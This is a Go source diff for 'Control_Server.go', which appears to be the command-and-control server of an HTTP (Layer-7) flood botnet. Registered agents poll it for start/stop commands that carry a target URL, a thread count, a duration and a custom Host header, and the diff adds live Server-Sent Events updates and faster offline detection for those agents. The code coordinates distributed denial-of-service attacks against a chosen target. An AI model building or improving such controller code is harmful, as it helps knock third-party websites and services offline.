@@ -1,3 +1,4 @@
+// Control_Server.go
 package main
 
 import (
@@ -10,31 +11,116 @@ import (
 	"time"
 )
 
-// Command and AgentStatus stay exactly as before:
+// -----------------------------
+// 1) Data models (unchanged):
+// -----------------------------
+
 type Command struct {
-	Action     string `json:"action"`      // "start" or "stop" or "none"
-	URL        string `json:"url"`         // Target URL for L7
-	Threads    int    `json:"threads"`     // # of threads
-	Timer      int    `json:"timer"`       // duration in seconds
-	CustomHost string `json:"custom_host"` // optional Host header
+	Action     string `json:"action"`
+	URL        string `json:"url"`
+	Threads    int    `json:"threads"`
+	Timer      int    `json:"timer"`
+	CustomHost string `json:"custom_host"`
 }
 
 type AgentStatus struct {
 	Online   bool   `json:"Online"`
 	Status   string `json:"Status"`
-	LastPing string `json:"LastPing"` // RFC3339 timestamp
+	LastPing string `json:"LastPing"`
 }
+
+// -----------------------------
+// 2) Global state & mutex:
+// -----------------------------
 
 var (
 	mu               sync.Mutex
-	registeredAgents = make(map[string]bool)
-	pendingCommands  = make(map[string]Command)
-	agentStatuses    = make(map[string]*AgentStatus)
+	registeredAgents = make(map[string]bool)         // agentID → registered?
+	pendingCommands  = make(map[string]Command)      // agentID → next Command
+	agentStatuses    = make(map[string]*AgentStatus) // agentID → current status
 )
 
-// How long since LastPing before we consider the agent "offline".
-// (Choose a value somewhat larger than the agent’s polling interval.)
-const offlineTimeout = 10 * time.Second
+// Reduce the offline timeout to 3s (instead of 10s)
+const offlineTimeout = 3 * time.Second
+
+// -----------------------------
+// 3) SSE infrastructure (no external imports):
+// -----------------------------
+
+type sseClient struct {
+	id      string
+	writer  http.ResponseWriter
+	flusher http.Flusher
+}
+
+var (
+	sseMu      sync.Mutex
+	sseClients = make(map[string]*sseClient)
+)
+
+// sendEvent broadcasts a JSON payload to all SSE clients.
+func sendEvent(eventName string, data interface{}) {
+	payload, err := json.Marshal(data)
+	if err != nil {
+		return
+	}
+
+	sseMu.Lock()
+	defer sseMu.Unlock()
+	for _, client := range sseClients {
+		fmt.Fprintf(client.writer, "event: %s\n", eventName)
+		fmt.Fprintf(client.writer, "data: %s\n\n", payload)
+		client.flusher.Flush()
+	}
+}
+
+// sseHandler upgrades GET /events into a long‐lived SSE stream.
+func sseHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	// Required SSE headers:
+	w.Header().Set("Content-Type", "text/event-stream")
+	w.Header().Set("Cache-Control", "no-cache")
+	w.Header().Set("Connection", "keep-alive")
+
+	// Ensure the ResponseWriter supports flushing:
+	flusher, ok := w.(http.Flusher)
+	if !ok {
+		http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
+		return
+	}
+
+	// Generate a simple client ID via timestamp:
+	clientID := fmt.Sprintf("%d", time.Now().UnixNano())
+	client := &sseClient{
+		id:      clientID,
+		writer:  w,
+		flusher: flusher,
+	}
+
+	sseMu.Lock()
+	sseClients[clientID] = client
+	sseMu.Unlock()
+
+	// Send an initial comment line to keep the connection open
+	fmt.Fprintf(w, ": connected\n\n")
+	flusher.Flush()
+
+	// Wait until the client disconnects
+	<-r.Context().Done()
+
+	// Remove this client from the map
+	sseMu.Lock()
+	delete(sseClients, clientID)
+	sseMu.Unlock()
+}
+
+// -----------------------------
+// 4) HTTP Handlers (unchanged, except they still call sendEvent):
+// -----------------------------
 
 func renderInterface(w http.ResponseWriter, r *http.Request) {
 	const filePath = "Interface/index.html"
@@ -70,6 +156,12 @@ func handleCommand(w http.ResponseWriter, r *http.Request) {
 	for agentID := range registeredAgents {
 		pendingCommands[agentID] = cmd
 		fmt.Printf("[CONTROL] Enqueued START for %s → %+v\n", agentID, cmd)
+
+		// Push an SSE “command-enqueued” event immediately
+		sendEvent("command-enqueued", map[string]interface{}{
+			"agentID": agentID,
+			"command": cmd,
+		})
 	}
 	mu.Unlock()
 
@@ -86,20 +178,18 @@ func agentPollHandler(w http.ResponseWriter, r *http.Request) {
 	now := time.Now().Format(time.RFC3339)
 
 	mu.Lock()
-	// Mark agent as registered and online
 	registeredAgents[agentID] = true
-	if _, exists := agentStatuses[agentID]; !exists {
+	if entry, exists := agentStatuses[agentID]; exists {
+		entry.Online = true
+		entry.LastPing = now
+	} else {
 		agentStatuses[agentID] = &AgentStatus{
 			Online:   true,
 			Status:   "Ready",
 			LastPing: now,
 		}
-	} else {
-		agentStatuses[agentID].Online = true
-		agentStatuses[agentID].LastPing = now
 	}
 
-	// If there is a pending command, pop it and return it
 	if cmd, exists := pendingCommands[agentID]; exists {
 		delete(pendingCommands, agentID)
 		w.Header().Set("Content-Type", "application/json")
@@ -109,7 +199,6 @@ func agentPollHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	mu.Unlock()
 
-	// No pending command → send {"action":"none"}
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(Command{Action: "none"})
 }
@@ -144,24 +233,27 @@ func agentStatusHandler(w http.ResponseWriter, r *http.Request) {
 		}
 		registeredAgents[payload.AgentID] = true
 	}
-	fmt.Printf("[CONTROL] Updated status of %s → %s at %s\n",
-		payload.AgentID,
-		payload.Status,
-		agentStatuses[payload.AgentID].LastPing,
-	)
+	updated := *agentStatuses[payload.AgentID]
 	mu.Unlock()
+
+	fmt.Printf("[CONTROL] Updated status of %s → %s at %s\n",
+		payload.AgentID, updated.Status, updated.LastPing)
+
+	// Broadcast the updated status via SSE
+	sendEvent("agent-status-changed", map[string]interface{}{
+		"agentID": payload.AgentID,
+		"status":  updated,
+	})
 
 	w.WriteHeader(http.StatusOK)
 }
 
 func listAgentStatuses(w http.ResponseWriter, r *http.Request) {
 	mu.Lock()
-	// Build a copy so we can marshal safely.
 	out := make(map[string]AgentStatus, len(agentStatuses))
 	for id, ptr := range agentStatuses {
 		copyEntry := *ptr
-		// If the agent is currently marked offline, wipe out its Status string:
-		if copyEntry.Online == false {
+		if !copyEntry.Online {
 			copyEntry.Status = ""
 		}
 		out[id] = copyEntry
@@ -172,41 +264,49 @@ func listAgentStatuses(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(out)
 }
 
-// ----------------------
-// NEW FUNCTION BELOW
-// ----------------------
+// -----------------------------
+// 5) Background: mark stale agents offline faster
+// -----------------------------
 
-// watchForOfflineAgents periodically checks LastPing on each agent.
-// If it’s older than offlineTimeout, it sets Online=false.
 func watchForOfflineAgents() {
-	ticker := time.NewTicker(1 * time.Second)
+	// Check every 100ms instead of 1s
+	ticker := time.NewTicker(100 * time.Millisecond)
 	defer ticker.Stop()
 
 	for range ticker.C {
 		cutoff := time.Now().Add(-offlineTimeout)
 		mu.Lock()
 		for agentID, statusPtr := range agentStatuses {
-			// Parse the LastPing timestamp
 			last, err := time.Parse(time.RFC3339, statusPtr.LastPing)
 			if err != nil {
-				// If parsing fails for some reason, treat as offline
 				statusPtr.Online = false
 				continue
 			}
 			if last.Before(cutoff) {
 				if statusPtr.Online {
-					fmt.Printf("[CONTROL] Marking agent %s as OFFLINE (last ping: %s)\n", agentID, statusPtr.LastPing)
+					fmt.Printf("[CONTROL] Marking agent %s as OFFLINE (last ping: %s)\n",
+						agentID, statusPtr.LastPing)
 				}
 				statusPtr.Online = false
+				statusPtr.Status = ""
+
+				// Broadcast the offline event immediately
+				sendEvent("agent-status-changed", map[string]interface{}{
+					"agentID": agentID,
+					"status":  *statusPtr,
+				})
 			}
-			// If last ≥ cutoff, leave Online as-is (presumably it’s already true)
 		}
 		mu.Unlock()
 	}
 }
 
+// -----------------------------
+// 6) main(): wire it all up
+// -----------------------------
+
 func main() {
-	// Serve static files from "Interface"
+	// Serve static files under “Interface/”
 	fs := http.FileServer(http.Dir("Interface"))
 	http.Handle("/Interface/", http.StripPrefix("/Interface/", fs))
 
@@ -215,8 +315,9 @@ func main() {
 	http.HandleFunc("/poll-agent", agentPollHandler)
 	http.HandleFunc("/agent-status", agentStatusHandler)
 	http.HandleFunc("/agent-statuses", listAgentStatuses)
+	http.HandleFunc("/events", sseHandler)
 
-	// Start the background goroutine that will mark stale agents as offline:
+	// Launch the faster “mark offline” goroutine
 	go watchForOfflineAgents()
 
 	fmt.Println("[CONTROL] Listening at http://localhost:8080")
